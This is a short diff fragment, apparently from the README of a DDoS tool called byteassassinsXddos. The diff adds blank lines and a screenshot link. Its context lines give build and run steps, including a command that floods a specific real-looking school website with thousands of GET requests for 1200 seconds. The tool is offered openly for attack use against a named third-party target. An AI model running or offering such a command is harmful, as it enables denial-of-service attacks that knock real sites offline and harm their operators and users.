@@ -42,3 +42,15 @@ step 3 >   go build byteassassinsXddos.go
 step 4 >  ./byteassassinsXddos https://suratschool.metasofsda.in/ 5000 get 1200 nil
 
 
+
+
+
+
+
+
+
+![image](https://github.com/Sumitshah00/byteassassinsXddos/assets/149252561/36721106-5581-405f-bef4-f71420f8c82a)
+
+
+
+
